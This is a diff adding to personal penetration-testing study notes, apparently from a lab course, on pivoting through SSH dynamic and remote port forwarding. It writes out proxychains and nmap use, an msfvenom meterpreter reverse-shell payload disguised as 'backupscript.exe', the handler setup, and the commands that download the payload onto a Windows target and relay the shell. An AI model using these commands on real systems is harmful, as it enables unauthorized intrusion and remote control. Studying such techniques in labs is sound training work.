@@ -25,6 +25,7 @@
 
 
 # Dynamic Port Forwarding
+idea is to send packets from attack host to target and scan like nmap ping sweep
 
 Port forwarding -> redirect a communication request from one port to another.
 
@@ -80,4 +81,110 @@ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 - how to transfer packets to 9050 (SOCKS proxy port) ???
 
 - here comes Proxychains
-- 
+
+```shell-session
+ssh -D 9050 ubuntu@10.129.202.64
+```
+
+#### /etc/proxychains.conf
+
+
+```shell-session
+tail -4 /etc/proxychains.conf
+
+# meanwile
+# defaults set to "tor"
+socks4 	127.0.0.1 9050
+```
+
+#### Using Nmap with Proxychains
+
+==only perform a `full TCP connect scan` over proxychains.==
+
+ proxychains cannot understand partial packets
+
+#### Using Metasploit with Proxychains
+
+```shell-session
+proxychains msfconsole
+```
+
+
+
+# Remote/Reverse Port Forwarding with SSH
+
+- idea is to get connection from target to attack host machine rev shell
+
+![[Pasted image 20240728002933.png]]
+
+`But what happens if we try to gain a reverse shell?`
+
+- `outgoing connection` for the Windows host is only limited to the `172.16.5.0/23` network.
+- find a pivot host, which is a common connection point between attack host and target
+- in this case ubuntu is pivot host
+
+![[Pasted image 20240723230547.png]]
+
+- windows server give reverse shell connection to pivot host on port 8080
+- from ubuntu server we forward the connection to Attack host (Reverse ssh connection)
+
+#### Creating a Windows Payload with msfvenom
+
+```shell-session
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+```
+
+- this gives connection to pivot host from windows
+- this payload is created in Attach host transfer to pivot host and then to Target windows
+
+#### Configuring & Starting the multi/handler
+
+
+```shell-session
+use exploit/multi/handler
+```
+
+```shell-session
+set payload windows/x64/meterpreter/reverse_https
+```
+
+```shell-session
+set lhost 0.0.0.0
+```
+
+```shell-session
+set lport 8000
+```
+
+```shell-session
+ run
+```
+
+#### Transferring Payload to Pivot Host
+
+```shell-session
+scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
+```
+
+#### Starting Python3 Webserver on Pivot Host
+
+```shell-session
+python3 -m http.server 8123
+```
+
+#### Downloading Payload from Windows Target
+
+```powershell-session
+Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+```
+
+#### Using SSH -R 
+
+- Transfering Reverse shell connnection from Pivot host -> attack host
+
+```shell-session
+ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+```
+
+![[Pasted image 20240728150113.png]]
+
